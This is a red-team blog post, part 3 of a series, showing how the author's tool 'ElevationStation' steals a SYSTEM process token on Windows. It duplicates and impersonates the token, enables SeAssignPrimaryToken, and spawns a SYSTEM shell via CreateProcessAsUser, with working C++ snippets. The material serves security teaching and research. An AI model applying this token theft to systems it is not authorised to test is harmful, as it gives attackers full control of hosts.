---
title:  "ElevationStation - A walkthrough through the development process [PART 3]"
categories:
  - privilege escalation
tags:
  - escalation
  - psexec
  - malware
  - red team
  - win32api
  - privesc
  - privilege escalation
  - elevationstation
  - getsystem
  - metasploit
---

Hey, we made it to part 3 already!  Glad you are still hanging around and hopefully this part is as insightful and exciting to you as it was for me...er...I get excited very easily.  You may not get as hyped as I did but that's cool, I'll shutup now and we can get started 😆  This is my favorite part of the entire code behind elevationstation, and consequently the portion of my research into privilege escalation using token manip that took the longest to figure out 😜

For Part 3, will be discussing SYSTEM token manipulation involving execution threads... 

Our goal: 
-
Spawn a SYSTEM shell within our current shell, and not a separate shell like we did in PART 1.

The Dilemma
- 
Each process has a set of privileges either enabled by default or disabled.  If the privilege we need isn't listed, we can't enable it.  There's no adding it magically into the process' current primary token.  We just so happen to need a privilege that is **NOT** enabled by default in an administrative command shell:
**SE_ASSIGNPRIMARYTOKEN_NAME**

Here are the token privileges for our admninistrative / elevated cmd.exe.  See for yourself, that privilege doesn't exist:
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/fb5c8af8-9eb8-4d0b-b986-fa4a4db5f08c)

Why do we even need this stupid privilege in the first place?  Because CreateProcessAsUser, which allows for spawning a cmd shell within the current console, **MUST** have this privilege enabled in almost all circumstances to execute a new process.  Check this out:

**CreateProcessAsUserA function (processthreadsapi.h)**

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/8c61852b-5e7c-481a-a81d-9d82e5bd6059)
[CreateProcessAsUser Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera)

The absolutely infuriating aspect to all this is **CreateProcessWithToken** is VERY forgiving with required token privileges for spawning a new process.  
However, it has a "bug" which will not allow the spawning of a process within the current process.  In our case, a new cmd shell within our current cmd shell.
If ANYONE knows a way around this, please, speak up.  Inquiring minds need to know 🤔

The Solution!
-
Residing in our target process we wish to steal privs from lies the highly sought after privilege we so desperately need.  

`Step 1` - We need to steal & impersonate the process impersonation token from the target process with SYSTEM privileges
```cpp
int DupThreadToken(DWORD pid)
{
    setProcessPrivs(SE_DEBUG_NAME);
    remoteproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
    if (remoteproc)
    {
        Color(2);
        wprintf(L"[+] Opened remote process!\n");
        Color(7);
    }
    else
    {
        Color(14);
        wprintf(L"[!] OpenProcess(). Error: %d\n", GetLastError());
        Color(7);
    }
    
   ➡️ if (!OpenProcessToken(remoteproc, TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &tok2)) ⬅️
    {
        Color(14);
        wprintf(L"[!] OpenProcessToken(). Error: %d\n", GetLastError());
        Color(7);
    }
```
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/2de0b57e-7b0f-4fc6-a4d2-923625e4992e)

Okay!  so now we have a handle to the process token for the target process, in this case it is **AppleMobleDeviceService.exe**, which is running as **NT AUTHORITY/SYSTEM**

Next up, we need to set the new token privs to our current process' execution thread.  I duplicate the impersonation token here to be on the safe side, but it may not be necessary. Either way, it works so no harm done.  So, dup the remote process token and then set the threadtoken to our current thread using `NULL`

```cpp
if (!DuplicateToken(tok2, SecurityImpersonation, &hNewToken))
    {
        Color(14);
        wprintf(L"[!] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
        Color(7);
    }
    if (SetThreadToken(NULL, hNewToken))
    {
        Color(2);
        printf("[+] Successfully set the thread token!\n");
        Color(7);
    }
```
We now have the remote process' privileges in our current process' execution thread!

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/dad2d5f9-7b27-4838-8f16-a81385051aee)

Now that we hold the privileges of the SYSTEM process, let's enable the privilege we wanted in the first place!

```cpp
setThreadPrivs(SE_INCREASE_QUOTA_NAME);     //need this for CreateProcessAsUser!
setThreadPrivs(SE_ASSIGNPRIMARYTOKEN_NAME); //need this for CreateProcessAsUser!
```
![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/2637214c-ab91-4c32-945a-52efcdcdf121)

Awesome, it's now enabled and I also went ahead and enabled SeIncreaseQuotaPrivilege too just in case.

We're almost there!  From here, we do some final magic and open a threadtoken against our current process now that we have all our privileges set, and duplicate that token to create a new primary token.  From there, we now finally have a handle to a brand new primary token that holds that privilege we needed from the **SYSTEM** process we stole it from!  All this just to spawn a shell within our current shell because this API is rude... 😠😆  Here's the code:
```cpp
 if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
    {
        Color(14);
        wprintf(L"[!] OpenThreadToken(). Error: %d\n", GetLastError());
        Color(7);
    }
  if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
    {
        Color(14);
        wprintf(L"[!] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
        Color(7);
    }
    bRet = CreateProcessAsUser(hSystemTokenDup, NULL, wszProcessName, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);

    if (bRet == 0)
    {
        Color(14);
        printf("[!] CreateProcessAsUser didn't cooperate...\n");
        Color(7);
        printf("Return value: %d\n", GetLastError());
    }
    else
    {
        Color(2);
        printf("[+] CreateProcessAsUser worked!!!\n");
        Color(7);
        printf("Return value: %d\n", bRet);
        fflush(stdout);
        WaitForSingleObject(ProcInfo.hProcess, INFINITE);

    }
```
and the shell!

![image](https://github.com/g3tsyst3m/g3tsyst3m.github.io/assets/19558280/a446b774-b475-4c2c-aa82-45e96ff21db3)

Okay, you can breathe.  It's over, you made it to the end. Well done.  I'm tired now so I'm going to bring this to a close.  Hopefully this made some sense and you learned how high maintenance some windows APIs can be. That said, we still managed to overcome our obstacle and pop that desired shell.  Until next time!

-RBC

